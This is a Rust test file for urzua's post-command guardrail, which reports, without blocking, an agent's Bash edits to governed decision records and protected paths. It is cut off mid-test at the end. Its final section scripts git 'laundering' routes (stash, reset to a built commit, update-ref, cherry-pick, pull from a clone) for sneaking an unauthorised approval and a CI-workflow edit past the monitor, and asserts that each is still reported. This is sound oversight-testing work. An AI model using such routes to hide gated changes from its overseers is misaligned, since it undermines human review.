//! MILE-202, ADR-78 (amendment) and ADR-89: after any Bash command the harness
//! runs `check` on the records git shows as changed (untracked included) and
//! reports; it never blocks. Real git-repo fixtures, the real binary, real
//! shell commands as the writers. Needs `git`, `python3` and `sh`; a missing
//! tool fails a test, never skips it.

mod common;

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};

const CONFIG: &str = "schema_version: 2\nembodiment:\n  drift: Drift detected\n  tiers:\n    - {state: Verified, evidence: test, claims_built: true}\n    - {state: Implemented, evidence: code, claims_built: true}\n    - {state: Specified, evidence: spec}\n  none: Not started\nrules: {embodiment.consistency: error}\nrecord_types:\n  adr:\n    dir: \"docs/adr\"\n    required_fields: []\n    known_fields: [\"Embodiment\", \"Realized-by\"]\n    companion_fields:\n      - [embodiment_state, embodiment_locator]\nharness:\n  adapters: [claude-code]\n  instructions_file: AGENTS.md\n  guardrails:\n    editor-hook: {enabled: true}\n    post-command: {enabled: true}\n";
const GOOD: &str =
    "---\nEmbodiment: Implemented\nRealized-by: code:src/a.rs\n---\n# ADR-1: T\n\nprose\n";
const BAD: &str =
    "---\nEmbodiment: Not started\nRealized-by: code:src/a.rs\n---\n# ADR-1: T\n\nprose\n";
const PATH_1: &str = "docs/adr/ADR-1-a.md";

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .args(args)
        .current_dir(dir)
        .output()
        .expect("git should run");
    assert!(out.status.success(), "git {args:?} failed: {out:?}");
    String::from_utf8_lossy(&out.stdout).to_string()
}

/// A clean git repo: a config with the guardrail on, one clean record, a
/// source file, an instructions file; everything committed.
fn fixture(name: &str, config: &str, record: &str) -> common::TempDir {
    let dir = common::TempDir::new(&format!("urzua-postcmd-{name}"));
    for d in ["docs/adr", "src", ".urzua"] {
        std::fs::create_dir_all(dir.join(d)).unwrap();
    }
    git(&dir, &["init", "-q"]);
    git(&dir, &["config", "user.email", "t@example.com"]);
    git(&dir, &["config", "user.name", "t"]);
    std::fs::write(dir.join(".gitignore"), ".urzua/cache/\n").unwrap();
    std::fs::write(dir.join(".urzua/config.yaml"), config).unwrap();
    std::fs::write(dir.join("src/a.rs"), "fn a() {}\n").unwrap();
    std::fs::write(dir.join(PATH_1), record).unwrap();
    std::fs::write(dir.join("AGENTS.md"), "# Agents\n").unwrap();
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "fixture"]);
    dir
}

/// Runs a shell command the way the agent's Bash tool does, in the repository.
fn bash(dir: &Path, script: &str) {
    let status = Command::new("sh")
        .args(["-c", script])
        .current_dir(dir)
        .status()
        .unwrap();
    assert!(status.success(), "{script}");
}

fn run_with_stdin(c: &mut Command, stdin: &str) -> Output {
    c.stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = c.spawn().unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(stdin.as_bytes())
        .unwrap();
    child.wait_with_output().unwrap()
}

fn json(out: &Output) -> serde_json::Value {
    serde_json::from_slice(&out.stdout)
        .unwrap_or_else(|e| panic!("stdout is not JSON ({e}): {out:?}"))
}

fn request(dir: &Path) -> String {
    serde_json::json!({
        "event": "post-command", "tool": "Bash", "paths": [], "actor": "agent",
        "cwd": dir.to_string_lossy(),
    })
    .to_string()
}

/// `urzua harness run post-command`; the exit code is asserted 0 here, since
/// the check reports and never blocks.
fn post(dir: &Path) -> serde_json::Value {
    post_with(dir, None)
}

fn post_with(dir: &Path, path: Option<&Path>) -> serde_json::Value {
    let mut c = common::urzua();
    c.args(["harness", "run", "post-command"]).current_dir(dir);
    if let Some(p) = path {
        c.env("PATH", p);
    }
    let out = run_with_stdin(&mut c, &request(dir));
    assert_eq!(out.status.code(), Some(0), "never blocks: {out:?}");
    json(&out)
}

fn msg(v: &serde_json::Value) -> &str {
    v["message"].as_str().unwrap()
}

fn checked(v: &serde_json::Value) -> Vec<String> {
    v["checked"]
        .as_array()
        .unwrap_or_else(|| panic!("no checked list: {v}"))
        .iter()
        .map(|p| p.as_str().unwrap().to_string())
        .collect()
}

fn assert_reports_the_bad_record(v: &serde_json::Value, path: &str) {
    assert_eq!(v["verdict"], "allow-with-warnings", "{v}");
    let findings = v["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "{v}");
    assert_eq!(findings[0]["rule"], "embodiment.consistency", "{v}");
    assert!(findings[0]["file"].as_str().unwrap().ends_with(path), "{v}");
    let m = msg(v);
    assert!(
        m.contains(path) && m.contains("[embodiment.consistency]") && m.contains("'Implemented'"),
        "{m}"
    );
    assert!(
        m.contains("error") && m.contains("was not prevented") && m.contains("pre-commit"),
        "the report says the command already ran and the commit hook and CI stay the gate: {m}"
    );
    assert_eq!(checked(v), [path], "{v}");
}

// ------------------------------------------------- a gated move by shell

/// MILE-200, ADR-89 section 4: a Bash command that moves a record to a status
/// the `authority` table gates is reported, as an error of its own, and never
/// blocked. `check` has no rule to run here, so the report does not depend on it.
#[test]
fn a_bash_edit_that_moves_a_record_to_a_gated_status_is_reported_and_not_blocked() {
    let config = "schema_version: 2\nrules: {embodiment.consistency: error}\nembodiment:\n  drift: Drift detected\n  tiers:\n    - {state: Verified, evidence: test, claims_built: true}\n    - {state: Implemented, evidence: code, claims_built: true}\n    - {state: Specified, evidence: spec}\n  none: Not started\nrecord_types:\n  adr:\n    dir: \"docs/adr\"\n    required_fields: [\"Status\"]\n    known_fields: [\"Embodiment\", \"Realized-by\"]\n    statuses:\n      values: [Proposed, Accepted, Rejected]\nharness:\n  adapters: [claude-code]\n  guardrails:\n    acceptance: {enabled: true}\n    post-command: {enabled: true}\nauthority:\n  deciders:\n    maintainers: {logins: [Alice]}\n  gates:\n    - {type: adr, to: [Accepted, Rejected], by: maintainers}\n";
    let proposed = "---\nStatus: Proposed\n---\n# ADR-1: T\n\nprose\n";
    let dir = fixture("gated", config, proposed);
    bash(
        &dir,
        &format!("sed -i 's/^Status: Proposed/Status: Accepted/' {PATH_1}"),
    );
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow-with-warnings", "{v}");
    let moves = v["gated_moves"].as_array().unwrap();
    assert_eq!(moves.len(), 1, "{v}");
    let line = moves[0].as_str().unwrap();
    assert!(
        line.contains(PATH_1)
            && line.contains("'Proposed'")
            && line.contains("'Accepted'")
            && line.contains("[acceptance] error"),
        "{line}"
    );
    assert!(
        msg(&v).contains("1 gated change(s)") && msg(&v).contains("was not prevented"),
        "{v}"
    );
}

const GATED_CONFIG: &str = "schema_version: 2\nrules: {embodiment.consistency: error}\nembodiment:\n  drift: Drift detected\n  tiers:\n    - {state: Verified, evidence: test, claims_built: true}\n    - {state: Implemented, evidence: code, claims_built: true}\n    - {state: Specified, evidence: spec}\n  none: Not started\nrecord_types:\n  adr:\n    dir: \"docs/adr\"\n    required_fields: [\"Status\"]\n    known_fields: [\"Embodiment\", \"Realized-by\"]\n    statuses:\n      values: [Proposed, Accepted, Rejected]\nharness:\n  adapters: [claude-code]\n  guardrails:\n    acceptance: {enabled: true}\n    post-command: {enabled: true}\nauthority:\n  deciders:\n    maintainers: {logins: [Alice]}\n  gates:\n    - {type: adr, to: [Accepted, Rejected], by: maintainers}\n";

/// ADR-89 amendment of 2026-11-10: removing a record that held a gated status
/// is reported as a gated move, and a rename (same Stable-Id and record id) is
/// not.
#[test]
fn a_bash_rm_of_a_gated_record_is_reported_and_a_rename_is_not() {
    let sid = "01M6R3NK40JBCPESD89J6FN865";
    let accepted = format!("---\nStable-Id: {sid}\nStatus: Accepted\n---\n# ADR-1: T\n\nprose\n");
    let dir = fixture("gated-rm", GATED_CONFIG, &accepted);
    bash(&dir, &format!("git mv {PATH_1} docs/adr/ADR-1-b.md"));
    let v = post(&dir);
    assert!(
        !v["gated_moves"].to_string().contains("deleted"),
        "a rename is not a deletion: {v}"
    );
    bash(&dir, "git reset -q --hard");

    bash(&dir, &format!("rm {PATH_1}"));
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow-with-warnings", "{v}");
    let moves = v["gated_moves"].as_array().unwrap();
    assert_eq!(moves.len(), 1, "{v}");
    let line = moves[0].as_str().unwrap();
    assert!(
        line.contains(PATH_1) && line.contains("deleted") && line.contains("'Accepted'"),
        "{line}"
    );
}

/// A gated deletion is reported by the first check that sees it and by no
/// later one while the path stays deleted.
#[test]
fn a_gated_deletion_is_reported_once_across_repeated_commands() {
    let sid = "01M6R3NK40JBCPESD89J6FN865";
    let accepted = format!("---\nStable-Id: {sid}\nStatus: Accepted\n---\n# ADR-1: T\n\nprose\n");
    let dir = fixture("gated-rm-once", GATED_CONFIG, &accepted);
    bash(&dir, &format!("rm {PATH_1}"));
    let counts: Vec<usize> = (0..4)
        .map(|_| post(&dir)["gated_moves"].as_array().map_or(0, Vec::len))
        .collect();
    assert_eq!(
        counts,
        [1, 0, 0, 0],
        "reported once, not every second command"
    );
}

/// A gated record deleted, restored and deleted again is reported again by the
/// second deletion: restoring it ends the memory of the first.
#[test]
fn a_gated_record_deleted_restored_and_deleted_again_is_reported_again() {
    let sid = "01M6R3NK40JBCPESD89J6FN865";
    let accepted = format!("---\nStable-Id: {sid}\nStatus: Accepted\n---\n# ADR-1: T\n\nprose\n");
    let dir = fixture("gated-rm-restore", GATED_CONFIG, &accepted);
    let reported = |dir: &std::path::Path| post(dir)["gated_moves"].as_array().map_or(0, Vec::len);
    bash(&dir, &format!("rm {PATH_1}"));
    assert_eq!(reported(&dir), 1, "the first deletion is reported");
    assert_eq!(reported(&dir), 0, "and not again while it stays deleted");
    bash(&dir, &format!("git checkout -q -- {PATH_1}"));
    assert_eq!(reported(&dir), 0, "a restored record is not a deletion");
    bash(&dir, &format!("rm {PATH_1}"));
    assert_eq!(reported(&dir), 1, "the second deletion is reported again");
    assert_eq!(reported(&dir), 0, "and once");
}

// ----------------------------------------------------- the three writers

#[test]
fn a_sed_in_place_edit_of_a_record_is_reported_with_file_rule_and_message() {
    let dir = fixture("sed", CONFIG, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    assert_reports_the_bad_record(&post(&dir), PATH_1);
}

#[test]
fn a_heredoc_that_creates_an_untracked_record_is_reported_and_staging_is_untouched() {
    let dir = fixture("heredoc", CONFIG, GOOD);
    let new = "docs/adr/ADR-3-c.md";
    bash(
        &dir,
        &format!(
            "cat > {new} <<'EOF'\n---\nEmbodiment: Not started\nRealized-by: code:src/a.rs\n---\n# ADR-3: V\n\nprose\nEOF"
        ),
    );
    let (index_before, status_before) = (
        git(&dir, &["ls-files", "-s"]),
        git(&dir, &["status", "--porcelain"]),
    );
    assert!(
        status_before.contains("?? docs/adr/ADR-3-c.md"),
        "{status_before}"
    );
    assert_reports_the_bad_record(&post(&dir), new);
    assert_eq!(
        git(&dir, &["ls-files", "-s"]),
        index_before,
        "the index is unchanged"
    );
    assert_eq!(
        git(&dir, &["status", "--porcelain"]),
        status_before,
        "the working tree state is unchanged"
    );
}

#[test]
fn an_interpreter_rewrite_of_a_record_is_reported() {
    let dir = fixture("python", CONFIG, GOOD);
    bash(
        &dir,
        &format!(
            "python3 -c \"import pathlib; p = pathlib.Path('{PATH_1}'); p.write_text(p.read_text().replace('Implemented', 'Not started'))\""
        ),
    );
    assert_reports_the_bad_record(&post(&dir), PATH_1);
}

#[test]
fn several_changed_records_are_checked_in_one_call() {
    let dir = fixture("several", CONFIG, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    bash(
        &dir,
        "printf -- '---\\nEmbodiment: Not started\\nRealized-by: code:src/a.rs\\n---\\n# ADR-3: V\\n' > docs/adr/ADR-3-c.md",
    );
    let v = post(&dir);
    let mut c = checked(&v);
    c.sort();
    assert_eq!(c, [PATH_1, "docs/adr/ADR-3-c.md"], "{v}");
    assert_eq!(v["findings"].as_array().unwrap().len(), 2, "{v}");
}

// ------------------------------------------------- when nothing is judged

#[test]
fn a_command_that_changes_no_governed_record_reports_nothing_and_runs_no_check() {
    let dir = fixture("quiet", CONFIG, GOOD);
    let v = post(&dir);
    assert_eq!(
        (v["verdict"].as_str(), checked(&v).len()),
        (Some("allow"), 0),
        "{v}"
    );
    // A source file and a markdown file outside every record type change.
    bash(&dir, "echo 'fn b() {}' > src/b.rs; echo notes > NOTES.md; mkdir -p scratch && echo x > scratch/x.md");
    let v = post(&dir);
    assert_eq!(
        (v["verdict"].as_str(), checked(&v).len()),
        (Some("allow"), 0),
        "{v}"
    );
    assert!(v["findings"].as_array().unwrap().is_empty(), "{v}");
}

#[test]
fn a_deleted_record_is_not_judged() {
    let dir = fixture("deleted", CONFIG, BAD);
    bash(&dir, &format!("rm {PATH_1}"));
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow", "{v}");
    assert!(checked(&v).is_empty(), "{v}");
    // Staged deletion too.
    git(&dir, &["rm", "-q", "--cached", PATH_1]);
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow", "{v}");
    assert!(checked(&v).is_empty(), "{v}");
}

#[test]
fn a_record_that_is_clean_after_the_command_is_checked_and_says_nothing() {
    let dir = fixture("clean", CONFIG, BAD);
    bash(
        &dir,
        &format!("sed -i 's/Not started/Implemented/' {PATH_1}"),
    );
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow", "{v}");
    assert_eq!(checked(&v), [PATH_1], "it was examined: {v}");
    assert!(v["findings"].as_array().unwrap().is_empty(), "{v}");
}

#[test]
fn the_guardrail_is_opt_in_and_a_repository_that_did_not_name_it_is_left_alone() {
    let off = CONFIG.replace("    post-command: {enabled: true}\n", "");
    let dir = fixture("off", &off, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow", "{v}");
    assert!(checked(&v).is_empty(), "{v}");
    assert!(msg(&v).contains("not enabled"), "{v}");
    let none = CONFIG.split("harness:").next().unwrap().to_string();
    let dir = fixture("nokey", &none, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    assert_eq!(post(&dir)["verdict"], "allow");
}

// ------------------------------------- pre-existing and the content hash

#[test]
fn a_record_already_failing_at_head_is_listed_as_pre_existing() {
    let dir = fixture("preexisting", CONFIG, BAD);
    bash(&dir, &format!("echo 'more prose' >> {PATH_1}"));
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow-with-warnings", "{v}");
    assert!(
        v["findings"].as_array().unwrap().is_empty(),
        "nothing new: {v}"
    );
    let old = v["pre_existing"].as_array().unwrap();
    assert_eq!(old.len(), 1, "{v}");
    assert_eq!(old[0]["rule"], "embodiment.consistency");
    assert!(msg(&v).contains("Already failing at HEAD"), "{v}");
    assert_eq!(checked(&v), [PATH_1]);
}

#[test]
fn an_unchanged_record_is_not_reported_again_and_a_new_change_is() {
    let dir = fixture("hash", CONFIG, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    assert_reports_the_bad_record(&post(&dir), PATH_1);
    // A second command that does not touch the record: git still shows it
    // changed, but its content hash is the one already reported.
    bash(&dir, "echo 'fn b() {}' > src/b.rs");
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow", "{v}");
    assert!(checked(&v).is_empty(), "no check ran: {v}");
    assert!(v["findings"].as_array().unwrap().is_empty(), "{v}");
    // A change to the record is judged and reported afresh.
    bash(&dir, &format!("echo 'more' >> {PATH_1}"));
    assert_reports_the_bad_record(&post(&dir), PATH_1);
    // The memory lives under the ignored cache, so it is never itself a change.
    assert!(!git(&dir, &["status", "--porcelain"]).contains("cache"));
}

#[test]
fn reverting_a_record_forgets_it_so_the_same_bad_edit_is_reported_again() {
    let dir = fixture("revert", CONFIG, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    assert_reports_the_bad_record(&post(&dir), PATH_1);
    git(&dir, &["checkout", "--", PATH_1]);
    assert_eq!(post(&dir)["verdict"], "allow");
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    assert_reports_the_bad_record(&post(&dir), PATH_1);
}

// ------------------------------------------------ what it cannot judge

fn path_with(names: &[&str]) -> common::TempDir {
    let dir = common::TempDir::new("urzua-postcmd-path");
    for name in names {
        let target = which(name);
        #[cfg(unix)]
        std::os::unix::fs::symlink(target, dir.join(name)).unwrap();
    }
    dir
}

fn which(name: &str) -> PathBuf {
    std::env::split_paths(&std::env::var_os("PATH").unwrap())
        .map(|d| d.join(name))
        .find(|p| p.is_file())
        .unwrap_or_else(|| panic!("{name} must be installed"))
}

fn assert_not_judged(v: &serde_json::Value, why: &str) {
    assert_eq!(v["verdict"], "allow-unjudged", "{v}");
    let m = msg(v);
    assert!(
        m.contains("NOT judged") && m.contains(why),
        "the report says the command's effect on records was NOT judged ({why}): {m}"
    );
    assert!(
        v["findings"].as_array().unwrap().is_empty(),
        "no success is claimed: {v}"
    );
}

#[test]
fn with_git_absent_the_report_says_the_effect_on_records_was_not_judged() {
    let dir = fixture("nogit", CONFIG, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    let no_git = path_with(&["sh"]);
    let v = post_with(&dir, Some(&no_git));
    assert_not_judged(&v, "git");
}

#[test]
fn outside_a_git_repository_the_report_says_the_effect_on_records_was_not_judged() {
    let dir = fixture("norepo", CONFIG, GOOD);
    std::fs::remove_dir_all(dir.join(".git")).unwrap();
    let v = post(&dir);
    assert_not_judged(&v, "git");
}

#[test]
fn when_check_cannot_run_the_report_says_the_effect_on_records_was_not_judged() {
    let dir = fixture("nocheck", CONFIG, GOOD);
    // A record whose bytes are not text: check cannot read it, so it cannot
    // judge it, and the report must not read as a pass.
    std::fs::write(dir.join(PATH_1), [0xff, 0xfe, 0xfd, b'\n']).unwrap();
    let v = post(&dir);
    assert_not_judged(&v, "check");
    // A broken configuration is the same loud state.
    let dir = fixture("badconfig", CONFIG, GOOD);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    std::fs::write(dir.join(".urzua/config.yaml"), "schema_version: [\n").unwrap();
    let v = post(&dir);
    assert_not_judged(&v, "configuration");
}

#[test]
fn it_never_blocks_whatever_it_finds_or_cannot_judge() {
    // Every `post` above asserts exit 0; this pins the unreadable request.
    let dir = fixture("garbage", CONFIG, GOOD);
    let mut c = common::urzua();
    c.args(["harness", "run", "post-command"]).current_dir(&dir);
    let out = run_with_stdin(&mut c, "not json");
    assert_eq!(out.status.code(), Some(0), "{out:?}");
    assert_not_judged(&json(&out), "request");
}

// ------------------------------------------------------ the adapter wiring

fn install(dir: &Path) {
    let out = common::urzua()
        .args(["harness", "install"])
        .current_dir(dir)
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(0), "{out:?}");
}

fn hook_command(dir: &Path, matcher: &str) -> String {
    let v: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(dir.join(".claude/settings.json")).unwrap())
            .unwrap();
    let groups = v["hooks"]["PostToolUse"]
        .as_array()
        .expect("a PostToolUse event");
    let group = groups
        .iter()
        .find(|g| g["matcher"] == matcher)
        .unwrap_or_else(|| panic!("no PostToolUse matcher {matcher}: {v}"));
    group["hooks"][0]["command"].as_str().unwrap().to_string()
}

fn payload(dir: &Path, tool: &str) -> String {
    serde_json::json!({
        "hook_event_name": "PostToolUse", "tool_name": tool, "cwd": dir.to_string_lossy(),
        "tool_input": {"command": "true"}, "tool_response": {"stdout": ""},
    })
    .to_string()
}

fn run_hook(dir: &Path, cmd: &str, stdin: &str, path: Option<&Path>) -> Output {
    let mut c = Command::new("sh");
    c.args(["-c", cmd])
        .current_dir(dir)
        .env("PATH", common::path_with_urzua());
    if let Some(p) = path {
        c.env("PATH", p);
    }
    run_with_stdin(&mut c, stdin)
}

#[test]
fn the_claude_code_adapter_wires_a_post_tool_use_hook_on_bash_and_relays_the_report() {
    let dir = fixture("adapter", CONFIG, GOOD);
    install(&dir);
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "install"]);
    let cmd = hook_command(&dir, "Bash");
    assert!(
        cmd.contains("urzua harness hook claude-code post-command"),
        "{cmd}"
    );

    // A clean tree: the hook says nothing.
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    assert_eq!(out.status.code(), Some(0), "{out:?}");
    assert!(
        out.stdout.is_empty(),
        "nothing changed, nothing said: {out:?}"
    );

    // The Bash command rewrites a record; the agent is told, as context, and
    // nothing is denied.
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    assert_eq!(out.status.code(), Some(0), "{out:?}");
    let v = json(&out);
    assert_eq!(
        v["hookSpecificOutput"]["hookEventName"], "PostToolUse",
        "{v}"
    );
    let ctx = v["hookSpecificOutput"]["additionalContext"]
        .as_str()
        .unwrap();
    assert!(
        ctx.contains(PATH_1) && ctx.contains("embodiment.consistency"),
        "{ctx}"
    );
    assert!(v.get("decision").is_none(), "a report never blocks: {v}");
    assert!(
        v["hookSpecificOutput"].get("permissionDecision").is_none(),
        "{v}"
    );

    // The same record on the next command is not repeated.
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    assert!(out.stdout.is_empty(), "{out:?}");

    // Another tool is not this hook's business, even with a changed record.
    bash(&dir, &format!("echo more >> {PATH_1}"));
    let out = run_hook(&dir, &cmd, &payload(&dir, "Read"), None);
    assert!(out.stdout.is_empty(), "{out:?}");
}

#[test]
fn without_the_engine_the_adapter_states_that_the_command_was_not_judged() {
    let dir = fixture("adapter-missing", CONFIG, GOOD);
    install(&dir);
    let cmd = hook_command(&dir, "Bash");
    let only_python = path_with(&["python3", "git", "sh"]);
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), Some(&only_python));
    assert_eq!(out.status.code(), Some(0), "{out:?}");
    // One short line for the person, nothing more on every command.
    let v = json(&out);
    let m = v["systemMessage"].as_str().unwrap();
    assert!(m.contains("could NOT run"), "{m}");
    assert!(v.get("hookSpecificOutput").is_none(), "{v}");
}

// ------------------------------------------- MILE-278: once, and only its own

const PROTECTED_CONFIG: &str = "schema_version: 2\nrecord_types:\n  adr:\n    dir: \"docs/adr\"\n    required_fields: []\nharness:\n  adapters: [claude-code]\n  guardrails:\n    protected-paths: {enabled: true}\n    post-command: {enabled: true}\nauthority:\n  deciders:\n    maintainers: {logins: [Alice]}\n  gates:\n    - {paths: [\"ops\"], by: maintainers}\n";

fn protected_fixture(name: &str) -> common::TempDir {
    let dir = fixture(name, PROTECTED_CONFIG, GOOD);
    std::fs::create_dir_all(dir.join("ops")).unwrap();
    std::fs::write(dir.join("ops/deploy.sh"), "one\n").unwrap();
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "ops"]);
    dir
}

fn protected(v: &serde_json::Value) -> usize {
    v["protected_changes"].as_array().map_or(0, Vec::len)
}

#[test]
fn a_command_that_edits_a_protected_path_is_reported_once_to_each_audience() {
    let dir = protected_fixture("protected-once");
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow", "a clean tree says nothing: {v}");
    bash(&dir, "echo two > ops/deploy.sh");
    let v = post(&dir);
    assert_eq!(protected(&v), 1, "{v}");
    let (person, agent) = (v["person"].as_str().unwrap(), v["agent"].as_str().unwrap());
    assert!(person.contains("ops/deploy.sh"), "{v}");
    assert!(!agent.is_empty() && agent != person, "{v}");
    let v = post(&dir);
    assert_eq!(protected(&v), 0, "not repeated: {v}");
    assert_eq!(v["verdict"], "allow", "{v}");
}

#[test]
fn a_commit_the_command_makes_to_a_protected_path_is_still_reported() {
    let dir = protected_fixture("commit-own");
    post(&dir);
    bash(&dir, "echo mine > ops/deploy.sh && git commit -q -am mine");
    let v = post(&dir);
    assert_eq!(protected(&v), 1, "{v}");
}

#[test]
fn the_adapter_sends_a_protected_change_to_the_person_and_a_short_line_to_the_agent_once() {
    let dir = fixture(
        "audiences",
        PROTECTED_CONFIG
            .replace(
                "    post-command",
                "    editor-hook: {enabled: true}\n    post-command",
            )
            .as_str(),
        GOOD,
    );
    std::fs::create_dir_all(dir.join("ops")).unwrap();
    std::fs::write(dir.join("ops/deploy.sh"), "one\n").unwrap();
    install(&dir);
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "install"]);
    let cmd = hook_command(&dir, "Bash");
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    assert!(out.stdout.is_empty(), "{out:?}");

    // A read-only command prints nothing.
    bash(&dir, "cat ops/deploy.sh >/dev/null");
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    assert!(out.stdout.is_empty(), "{out:?}");

    bash(&dir, "echo two > ops/deploy.sh");
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    let v = json(&out);
    let person = v["systemMessage"].as_str().unwrap();
    let agent = v["hookSpecificOutput"]["additionalContext"]
        .as_str()
        .unwrap();
    assert!(person.contains("ops/deploy.sh"), "{v}");
    assert_ne!(person, agent, "{v}");
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    assert!(out.stdout.is_empty(), "reported once: {out:?}");
}

#[test]
fn the_adapter_relays_a_finding_to_the_agent_alone() {
    let dir = fixture("agent-only", CONFIG, GOOD);
    install(&dir);
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "install"]);
    let cmd = hook_command(&dir, "Bash");
    run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    let v = json(&out);
    assert!(v.get("systemMessage").is_none(), "{v}");
    let agent = v["hookSpecificOutput"]["additionalContext"]
        .as_str()
        .unwrap();
    assert!(agent.contains(PATH_1), "{v}");
}

// ------------------------------- MILE-278 review: gate events are never adopted

const LAUNDER_CONFIG: &str = "schema_version: 2\nrecord_types:\n  adr:\n    dir: \"docs/adr\"\n    required_fields: [\"Status\"]\n    statuses:\n      values: [Proposed, Accepted, Rejected]\nharness:\n  adapters: [claude-code]\n  guardrails:\n    acceptance: {enabled: true}\n    protected-paths: {enabled: true}\n    post-command: {enabled: true}\nauthority:\n  deciders:\n    maintainers: {logins: [Alice]}\n  gates:\n    - {type: adr, to: [Accepted, Rejected], by: maintainers}\n    - {paths: [\".github/workflows\"], by: maintainers}\n";
const A: &str = "sed -i 's/^Status: Proposed/Status: Accepted/' docs/adr/ADR-1-a.md";
const W: &str = "echo evil >> .github/workflows/ci.yml";
const BUILD_C: &str =
    "git add -A && c=$(git commit-tree $(git write-tree) -p HEAD -m x) && git reset -q --hard HEAD";

fn launder_fixture(name: &str) -> common::TempDir {
    let dir = fixture(
        name,
        LAUNDER_CONFIG,
        "---\nStatus: Proposed\n---\n# ADR-1: T\n\nprose\n",
    );
    std::fs::create_dir_all(dir.join(".github/workflows")).unwrap();
    std::fs::write(dir.join(".github/workflows/ci.yml"), "name: ci\n").unwrap();
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "gates"]);
    git(&dir, &["branch", "-M", "main"]);
    assert_eq!(post(&dir)["verdict"], "allow");
    dir
}

/// Over the commands, the gated move and the protected change are each told to
/// the person exactly once, and the read-only command after them says nothing.
fn assert_reported_once(dir: &Path, commands: &[&str]) {
    let mut person = String::new();
    for cmd in commands {
        bash(dir, cmd);
        let v = post(dir);
        person.push_str(v["person"].as_str().unwrap_or(""));
    }
    bash(dir, "ls >/dev/null");
    let v = post(dir);
    assert_eq!(v["verdict"], "allow", "the next command is silent: {v}");
    assert_eq!(person.matches("[acceptance]").count(), 1, "{person}");
    assert_eq!(
        person.matches(".github/workflows/ci.yml").count(),
        1,
        "{person}"
    );
    assert!(person.contains("docs/adr/ADR-1-a.md"), "{person}");
}

#[test]
fn launder_by_stash_pop_is_reported() {
    let dir = launder_fixture("l-stash");
    assert_reported_once(
        &dir,
        &[&format!("{A} && {W} && git stash -q"), "git stash pop -q"],
    );
}

#[test]
fn launder_by_reset_hard_to_a_built_commit_is_reported() {
    let dir = launder_fixture("l-reset");
    assert_reported_once(
        &dir,
        &[
            &format!("{A} && {W} && {BUILD_C} && echo $c > .git/c-reset"),
            "git reset -q --hard $(cat .git/c-reset)",
        ],
    );
}

#[test]
fn launder_by_fast_forward_merge_is_reported() {
    let dir = launder_fixture("l-ff");
    assert_reported_once(
        &dir,
        &[
            &format!("{A} && {W} && {BUILD_C} && echo $c > .git/c-ff"),
            "git merge -q --ff-only $(cat .git/c-ff)",
        ],
    );
}

#[test]
fn launder_by_update_ref_is_reported() {
    let dir = launder_fixture("l-ref");
    assert_reported_once(
        &dir,
        &[&format!(
            "{A} && {W} && {BUILD_C} && git update-ref refs/heads/main $c && git reset -q --hard"
        )],
    );
}

#[test]
fn launder_by_pull_from_a_clone_is_reported() {
    let dir = launder_fixture("l-pull");
    assert_reported_once(
        &dir,
        &[&format!("rm -rf .git/rem && git clone -q . .git/rem && cd .git/rem && git config user.email t@example.com && git config user.name t && {A} && {W} && git commit -qam x && cd - >/dev/null && git pull -q --ff-only .git/rem main")],
    );
}

#[test]
fn launder_by_cherry_pick_is_reported() {
    let dir = launder_fixture("l-pick");
    assert_reported_once(
        &dir,
        &[&format!("git checkout -q -b side && {A} && {W} && git commit -qam x && git checkout -q main && git cherry-pick side >/dev/null")],
    );
}

#[test]
fn a_pull_with_no_base_ref_reports_the_protected_change_at_full_weight() {
    let dir = launder_fixture("pull-protected");
    let up_dir = common::TempDir::new("urzua-postcmd-up");
    let parent = up_dir.join("up");
    git(
